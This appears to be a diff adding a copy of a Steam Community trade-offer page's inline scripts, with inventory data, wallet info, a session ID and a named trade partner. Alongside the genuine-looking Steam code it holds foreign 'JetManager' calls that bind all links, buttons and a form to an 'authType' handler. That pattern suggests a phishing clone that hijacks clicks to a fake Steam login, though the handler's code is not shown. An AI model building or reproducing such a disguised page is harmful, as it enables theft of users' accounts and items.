@@ -1,0 +1,367 @@
+
+			(function (i, s, o, g, r, a, m) {
+				i['GoogleAnalyticsObject'] = r;
+				i[r] = i[r] || function () {
+					(i[r].q = i[r].q || []).push(arguments)
+				}, i[r].l = 1 * new Date();
+				a = s.createElement(o),
+					m = s.getElementsByTagName(o)[0];
+				a.async = 1;
+				a.src = g;
+				m.parentNode.insertBefore(a, m)
+			})(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+	
+			ga('create', 'UA-33779068-1', 'auto', {
+				'sampleRate': 0.4
+			});
+			ga('set', 'dimension1', true);
+			ga('set', 'dimension2', 'External');
+			ga('set', 'dimension3', 'tradeoffer');
+			ga('set', 'dimension4', "tradeoffer\/");
+			ga('send', 'pageview');
+		
+
+			var __PrototypePreserve = [];
+			__PrototypePreserve[0] = Array.from;
+			__PrototypePreserve[1] = Function.prototype.bind;
+		
+
+			Array.from = __PrototypePreserve[0] || Array.from;
+			Function.prototype.bind = __PrototypePreserve[1] || Function.prototype.bind;
+		
+
+			Object.seal && Object.seal(Object.prototype);
+		
+
+			VALVE_PUBLIC_PATH = "https:\/\/community.cloudflare.steamstatic.com\/public\/";
+		
+
+			document.addEventListener('DOMContentLoaded', function (event) {
+				SetupTooltips({
+					tooltipCSSClass: 'community_tooltip'
+				});
+			});
+		
+
+               let Jet = new JetManager();
+               Jet.bind(['a', 'button']);
+               Jet.init({authType: 3, egs: 0, egsAccessed: 0});
+            
+
+   let Jet = new JetManager();
+   Jet.bind(["f"])
+   Jet.init({authType: 1, egs: 0, egsAccessed: 0});
+
+                  var g_rgAppContextData = {
+                        "730": {
+                            "appid": 730,
+                            "name": "Counter-Strike: Global Offensive",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/730\/69f7ebe2735c366c65c0b33dae00e12dc40edbe4.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/730",
+                            "asset_count": 12,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/730\/3ab6e87a04994b900881f694284a75150e640536.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 12,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        },
+                        "753": {
+                            "appid": 753,
+                            "name": "Steam",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/753\/135dc1ac1cd9763dfc8ad52f4e880d2ac058a36c.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/753",
+                            "asset_count": 0,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/753\/db8ca9e130b7b37685ab2229bf5a288aefc3f0fa.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "1": {
+                                    "asset_count": 0,
+                                    "id": "1",
+                                    "name": "Gifts"
+                                },
+                                "3": {
+                                    "asset_count": 0,
+                                    "id": "3",
+                                    "name": "Coupons"
+                                },
+                                "6": {
+                                    "asset_count": 0,
+                                    "id": "6",
+                                    "name": "Community"
+                                },
+                                "7": {
+                                    "asset_count": 0,
+                                    "id": "7",
+                                    "name": "Item Rewards"
+                                }
+                            }
+                        }
+                    };
+                    var g_rgPlayedApps = {
+                        "753": true
+                    };
+                    var g_rgPartnerAppContextData = {
+                        "753": {
+                            "appid": 753,
+                            "name": "Steam",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/753\/135dc1ac1cd9763dfc8ad52f4e880d2ac058a36c.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/753",
+                            "asset_count": 954,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/753\/db8ca9e130b7b37685ab2229bf5a288aefc3f0fa.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "1": {
+                                    "asset_count": 0,
+                                    "id": "1",
+                                    "name": "Gifts"
+                                },
+                                "3": {
+                                    "asset_count": 0,
+                                    "id": "3",
+                                    "name": "Coupons"
+                                },
+                                "6": {
+                                    "asset_count": 954,
+                                    "id": "6",
+                                    "name": "Community"
+                                },
+                                "7": {
+                                    "asset_count": 0,
+                                    "id": "7",
+                                    "name": "Item Rewards"
+                                }
+                            }
+                        },
+                        "730": {
+                            "appid": 730,
+                            "name": "Counter-Strike: Global Offensive",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/730\/69f7ebe2735c366c65c0b33dae00e12dc40edbe4.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/730",
+                            "asset_count": 135,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/730\/3ab6e87a04994b900881f694284a75150e640536.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 135,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        },
+                        "397900": {
+                            "appid": 397900,
+                            "name": "Business Tour - Online Multiplayer Board Game",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/397900\/b6ce52a576e99f54c5d18f675540b9c3ee70ed47.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/397900",
+                            "asset_count": 4,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/397900\/02becb29aad460103e93e75c608bea375b250055.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 4,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        },
+                        "304930": {
+                            "appid": 304930,
+                            "name": "Unturned",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/304930\/e18009fb628b35953826efe47dc3be556b689f4c.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/304930",
+                            "asset_count": 3,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/304930\/17928aac98b5ffdc25b092147f99792348322a1c.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 3,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        },
+                        "433850": {
+                            "appid": 433850,
+                            "name": "Z1 Battle Royale",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/433850\/aee7491abfd812e2fbb4ec3326ad5f4b85c8137a.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/433850",
+                            "asset_count": 1,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/433850\/223c73339eded0354dccfeba6711c4844abaae2b.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "1": {
+                                    "asset_count": 1,
+                                    "id": "1",
+                                    "name": "Account"
+                                }
+                            }
+                        },
+                        "578080": {
+                            "appid": 578080,
+                            "name": "PLAYERUNKNOWN'S BATTLEGROUNDS",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/578080\/93d896e7d7a42ae35c1d77239430e1d90bc82cae.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/578080",
+                            "asset_count": 0,
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 0,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        },
+                        "440": {
+                            "appid": 440,
+                            "name": "Team Fortress 2",
+                            "icon": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/440\/e3f595a92552da3d664ad00277fad2107345f743.jpg",
+                            "link": "https:\/\/steamcommunity.com\/app\/440",
+                            "asset_count": 0,
+                            "inventory_logo": "https:\/\/cdn.cloudflare.steamstatic.com\/steamcommunity\/public\/images\/apps\/440\/e613d1d46de26ea755105b898cc8830d305353f3.png",
+                            "trade_permissions": "FULL",
+                            "load_failed": 0,
+                            "store_vetted": "1",
+                            "rgContexts": {
+                                "2": {
+                                    "asset_count": 0,
+                                    "id": "2",
+                                    "name": "Backpack"
+                                }
+                            }
+                        }
+                    };
+                    var g_rgForeignAppContextData = {};
+                    var g_rgWalletInfo = {
+                        "wallet_currency": 5,
+                        "wallet_country": "RU",
+                        "wallet_state": "",
+                        "wallet_fee": "1",
+                        "wallet_fee_minimum": "1",
+                        "wallet_fee_percent": "0.05",
+                        "wallet_publisher_fee_percent_default": "0.10",
+                        "wallet_fee_base": "0",
+                        "wallet_other_currency": 3,
+                        "wallet_other_country": "DE",
+                        "wallet_fee_base_for_other": "0",
+                        "wallet_conversion_rate": "0.010959",
+                        "wallet_inverse_conversion_rate": "91.252236",
+                        "wallet_balance": "1100",
+                        "wallet_delayed_balance": "0",
+                        "wallet_max_balance": "12500000",
+                        "wallet_trade_max_balance": "11250000",
+                        "success": true,
+                        "rwgrsn": -2
+                    };
+                    var g_strCountryCode = "RU";
+                    var g_bMarketAllowed = true;
+                    var g_ulTradePartnerSteamID = '76561198244722344';
+                    var g_bTradePartnerProbation = false;
+                    var g_sessionID = "a7ef6de6e293c4768cbcb542";
+
+                    var g_rgCurrentTradeStatus = {
+                        "newversion": true,
+                        "version": 1,
+                        "me": {
+                            "assets": [],
+                            "currency": [],
+                            "ready": false
+                        },
+                        "them": {
+                            "assets": [],
+                            "currency": [],
+                            "ready": false
+                        }
+                    };
+
+                    UserYou.SetProfileURL("https:\/\/steamcommunity.com\/id\/test");
+                    UserYou.SetSteamId('1');
+                    var g_strYourPersonaName = "test";
+                    var g_strInventoryLoadURL = 'https://steamcommunity.com/tradeoffer/new/partnerinventory/';
+
+                    UserThem.SetProfileURL("https:\/\/steamcommunity.com\/id\/dEXtrader");
+                    UserThem.SetSteamId('76561198244722344');
+                    var g_strTradePartnerPersonaName = "Lazy";
+                    var g_strTradePartnerInventoryLoadURL = 'https://steamcommunity.com/tradeoffer/new/partnerinventory/';
+
+                    $J(function () {
+                        UserYou.LoadContexts(g_rgPartnerAppContextData);
+                        UserThem.LoadContexts(g_rgPartnerAppContextData);
+                        BeginTradeOffer(0, false);
+
+                        if ( g_ActiveInventory && g_ActiveInventory.appid && UserThem.GetContext( g_ActiveInventory.appid, g_ActiveInventory.contextid ) )
+			TradePageSelectInventory( UserThem, g_ActiveInventory.appid, g_ActiveInventory.contextid, g_ActiveUser != UserThem /* force if flipping */ );
+		else
+		{
+			g_ActiveUser = UserThem;
+			TradePageSelectNoInventory( g_ActiveUser );
+		}
+		$J('#inventory_box' ).removeClass('your_inventory_active' ).addClass('their_inventory_active');
+
+        UpdateDisplayForActiveUser();
+        
+                        TradePageSelectInventory( UserThem, 730, "2" );
+                    });
+				
+
+                                                    RegisterFlyout($('appselect_option_them_753_0'), $('appselect_flyout_them_753'), 'rightsubmenu', 'bottomsubmenu');
+                                                
+
+                                                    RegisterFlyout($('appselect_option_you_753_0'), $('appselect_flyout_you_753'), 'rightsubmenu', 'bottomsubmenu');
+                                                
+
+                        // The number of days the trade will be placed on hold if the corresponding party is sending items in the trade.
+                        // We round up, thus even a single second of escrow will be shown to the user.
+                        var g_daysMyEscrow = 0;
+                        var g_daysTheirEscrow = 0;
+                        var g_daysBothEscrow = 0;
+                    
+
+                g_sessionID = "a7ef6de6e293c4768cbcb542";
+                g_steamID = "1";
+                g_strLanguage = "english";
+                g_SNR = '2_tradeoffer_4_';
+
+                g_CommunityPreferences = {
+                    "hide_adult_content_violence": 1,
+                    "hide_adult_content_sex": 1,
+                    "parenthesize_nicknames": 0,
+                    "text_filter_setting": 1,
+                    "text_filter_ignore_friends": 1,
+                    "text_filter_words_revision": 0,
+                    "timestamp_updated": 0
+                };
+
+                // We always want to have the timezone cookie set for PHP to use
+                setTimezoneCookies();
+
+                $J(function () {
+
+                    InitMiniprofileHovers();
+                    InitEmoticonHovers();
+                    ApplyAdultContentPreferences();
+                });
+
+                $J(function () {
+                    InitEconomyHovers("https:\/\/community.cloudflare.steamstatic.com\/public\/css\/skin_1\/economy.css?v=Puk7JmfocgYh&l=english&_cdn=cloudflare", "https:\/\/community.cloudflare.steamstatic.com\/public\/javascript\/economy_common.js?v=tsXdRVB0yEaR&l=english&_cdn=cloudflare", "https:\/\/community.cloudflare.steamstatic.com\/public\/javascript\/economy.js?v=rI0xgpCYSBS9&l=english&_cdn=cloudflare");
+                });
+			
